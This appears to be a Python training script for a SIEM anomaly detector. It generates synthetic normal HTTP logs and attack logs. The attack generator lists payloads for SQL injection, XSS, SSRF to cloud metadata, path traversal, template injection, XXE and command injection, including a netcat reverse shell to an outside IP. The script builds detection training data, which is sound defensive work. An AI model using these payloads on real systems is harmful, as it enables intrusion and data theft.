#!/usr/bin/env python3
"""
Script d'entraînement des modèles ML
Génère des données synthétiques et entraîne le détecteur d'anomalies
"""

import sys
import os

# Chemin absolu du dossier racine du projet
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, BASE_DIR)

from ml.anomaly_detector import AnomalyDetector
import random

def generate_normal_logs(count: int = 2000) -> list:
    """Génère des logs HTTP normaux (Diversifiés: Custom + Apache CLF)"""
    logs = []
    
    # Endpoints diversifiés
    api_endpoints = ["/api/teachers", "/api/students", "/api/classes", "/api/search", "/api/users", "/api/auth/profile", "/api/settings"]
    static_endpoints = ["/index.html", "/style.css", "/main.js", "/favicon.ico", "/images/logo.png", "/fonts/inter.woff2", "/robots.txt"]
    public_endpoints = ["/", "/about", "/contact", "/login", "/register", "/faq", "/blog", "/services"]
    
    all_endpoints = api_endpoints + static_endpoints + public_endpoints
    methods = ["GET", "POST", "PUT", "DELETE", "OPTIONS"]
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
    ]
    
    for i in range(count):
        # On utilise ::1 comme IP car c'est ce qu'on voit dans les logs de l'utilisateur
        ip = "::1"
        time_iso = f"2026-02-04T{random.randint(0,23):02d}:{random.randint(0,59):02d}:{random.randint(0,59):02d}.{random.randint(100,999)}Z"
        
        # Majorité de logs au format unifié (siem) pour coller à l'usage de l'utilisateur
        is_clf = random.random() > 0.8
        
        method = random.choice(methods)
        path = random.choice(all_endpoints)
        if random.random() > 0.7: path += f"/{random.randint(1,1000)}"
        
        status = random.choice([200, 200, 200, 201, 204, 301, 302, 304, 401])
        size = random.randint(100, 5000)
        ua = random.choice(user_agents)
        
        if is_clf:
            time_clf = "04/Feb/2026:12:00:00 +0100"
            log = f'{ip} - - [{time_clf}] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"'
        else:
            body = ""
            if method in ["POST", "PUT"] and ("/api/" in path or "home" in path or "dashboard" in path):
                first = random.choice(["Lyes", "Amine", "Sarah", "Karim", "Zouina"])
                last = random.choice(["Abada", "Ziri", "Belaid", "Doukha", "Merah"])
                action = random.choice(["update", "create", "view", "login"])
                
                if "auth" in path:
                    body = f' body:{{"username":"admin","action":"{action}"}}'
                else:
                    body = f' body:{{"name":"{first} {last}","action":"{action}"}}'
            
            duration = f"{random.randint(2, 50)}ms"
            log = f"[{time_iso[11:19]}] {time_iso}  {ip}  {method} {path}{body}  {status}  {duration}"
        
        logs.append(log)
    
    return logs

def generate_attack_logs(count: int = 200) -> list:
    """Génère des logs d'attaques diversifiés (XSS renforcé)"""
    logs = []
    
    attacks = {
        "SQLI": [
            "' OR 1=1--", "UNION SELECT NULL,username,password FROM users", 
            "1; DROP TABLE logs", "admin' --", "' OR 'a'='a",
            "1' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--"
        ],
        "XSS": [
            "<script>alert(1)</script>", "<img src=x onerror=alert(1)>", 
            "javascript:alert('xss')", "<svg/onload=alert(1)>", "projets' onmouseover='alert(1)",
            "'\"><script>alert(document.cookie)</script>",
            "<details open ontoggle=alert(1)>",
            "<a href=\"javascript:alert(1)\">click</a>"
        ],
        "NoSQL": [
            '{"$gt": ""}', '{"$ne": null}', '{"$where": "this.password.length > 0"}',
            '{"username": {"$regex": ".*"}}', '{"admin": {"$exists": true}}',
            '{"$or": [{"user": "admin"}, {"user": "root"}]}'
        ],
        "IDOR/BAC": [
            "/api/users/1/profile", "/api/admin/config", "/api/v1/debug/dump",
            "/api/payments/123/receipt", "/api/messages/all"
        ],
        "SSRF": [
            "http://169.254.169.254/latest/meta-data/", "http://localhost:8080/admin",
            "file:///etc/passwd", "gopher://localhost:70/1", "dict://localhost:11211/stat"
        ],
        "ProtoPollution": [
            '{"__proto__": {"admin": true}}', '{"constructor": {"prototype": {"polluted": "yes"}}}',
            '{"__proto__": {"sourceURL": "javascript:alert(1)"}}'
        ],
        "Traversal": ["../../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "/api/files?path=../../../conf/settings.py", "/static/../../.env"],
        "RCE/Shell": [
            "; whoami", "| ls -la", "$(id)", "cmd.exe /c dir", 
            "powershell -Command Get-Process", "nc -e /bin/bash 10.0.0.1 4444",
            "{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}"
        ],
        "Sensitive": ["/phpmyadmin", "/.git/config", "/backup.zip", "/config.json", "/admin/setup.php", "/etc/shadow"],
        "ZeroDay": [
            '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata">]><root>&xxe;</root>',
            '{"user": {"permissions": ["system_admin", "root_shell"], "trust_level": 100, "internal_id": "000x-ff-99"}}',
            "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAAAAAAFDIdVAAIAAkYACmxvYWRGYWN0b3JJAAl0aHJlc2hvbGR4cD9AAAAAAAAMdwgAAAAQAAAABXQAAnB3c",
            "{{7*7}} ${7*7} #{7*7} [*{7*7}]",
            "php://filter/convert.base64-encode/resource=index",
            "\x00\x01\x02\x03\xff\xfe\xfd\xfc_potentially_binary_payload_",
            "GET /api/v1/internal/debug?cmd=inspect&target=mempool&depth=99"
        ]
    }
    
    attack_types = list(attacks.keys())
    
    for i in range(count):
        atype = random.choice(attack_types)
        payload = random.choice(attacks[atype])
        
        ip = f"45.33.{random.randint(1,255)}.{random.randint(1,255)}"
        method = random.choice(["GET", "POST"])
        
        if atype == "SQLI" or atype == "XSS":
            if method == "POST":
                path = "/api/login" if atype == "SQLI" else "/api/comments"
                body = f' body:{{"input":"{payload}"}}'
            else:
                path = f"/api/search?q={payload}"
                body = ""
        elif atype == "Traversal":
            path = f"/api/download?file={payload}"
            body = ""
        elif atype == "RCE/Shell":
            path = f"/api/tools/ping"
            body = f' body:{{"host":"8.8.8.8{payload}"}}'
        else: # Sensitive
            path = payload
            body = ""

        # Format unifié aléatoire ou CLF
        if random.random() > 0.5:
            time_clf = "04/Feb/2026:12:05:00 +0100"
            log = f'{ip} - - [{time_clf}] "{method} {path} HTTP/1.1" 200 512 "-" "HackBot/1.0"'
        else:
            time_iso = "2026-02-04T12:05:00.000Z"
            log = f"[12:05:00] {time_iso}  {ip}  {method} {path}{body}  200  10ms"
            
        logs.append(log)
    
    return logs

def main():
    # print("=" * 60)
    # print("ENTRAÎNEMENT AMÉLIORÉ DU MODÈLE ML - SIEM")
    # print("=" * 60)
    
    # 1. Générer les données
    # print("\n[1/4] Génération des données d'entraînement (Logs diversifiés)...")
    train_normal = generate_normal_logs(5000) # Augmenté
    valid_normal = generate_normal_logs(500)
    valid_attacks = generate_attack_logs(500)
    # print(f"  ✓ {len(train_normal)} logs normaux pour l'entraînement")
    # print(f"  ✓ {len(valid_normal)} logs normaux pour la validation")
    # print(f"  ✓ {len(valid_attacks)} logs d'attaques pour la validation")
    
    # 2. Entraîner le modèle
    # print("\n[2/4] Entraînement du détecteur d'anomalies (Isolation Forest + Scaler)...")
    detector = AnomalyDetector()
    # Contamination (1%)
    detector.train(train_normal, contamination=0.01)
    
    # 3. Évaluation précise
    # print("\n[3/4] Évaluation de la précision du modèle...")
    
    # print("\n  Test sur logs NORMRAUX (Faux Positifs):")
    fp = 0
    normal_scores = []
    for log in valid_normal:
        is_anomaly, score = detector.predict(log)
        normal_scores.append(score)
        if is_anomaly: fp += 1
    
    fp_rate = (fp / len(valid_normal)) * 100
    avg_normal_score = sum(normal_scores) / len(normal_scores)
    # print(f"    - Taux de Faux Positifs: {fp_rate:.1f}% ({fp}/{len(valid_normal)})")
    # print(f"    - Score moyen (Normal): {avg_normal_score:.3f}")
    
    # print("\n  Test sur logs d'ATTAQUE (Vrais Positifs):")
    tp = 0
    attack_scores = []
    for log in valid_attacks:
        is_anomaly, score = detector.predict(log)
        attack_scores.append(score)
        if is_anomaly: tp += 1
    
    tp_rate = (tp / len(valid_attacks)) * 100
    avg_attack_score = sum(attack_scores) / len(attack_scores)
    # print(f"    - Taux de Vrais Positifs (Détection): {tp_rate:.1f}% ({tp}/{len(valid_attacks)})")
    # print(f"    - Score moyen (Attaque): {avg_attack_score:.3f}")
    
    # 4. Sauvegarde
    # print("\n[4/4] Sauvegarde du modèle et du scaler...")
    detector.save_model()
    
    # print("\n" + "=" * 60)
    # print("RÉSUMÉ FINAL")
    # print("=" * 60)
    if tp_rate > 95 and fp_rate < 5:
        print("  ÉVALUATION: EXCELLENTE")
    elif tp_rate > 80 and fp_rate < 10:
        print("  ÉVALUATION: BONNE")
    else:
        print("  ÉVALUATION: À AMÉLIORER")
        
    # print(f"\n✓ Entraînement terminé avec succès!")
    # print("=" * 60)

if __name__ == "__main__":
    main()
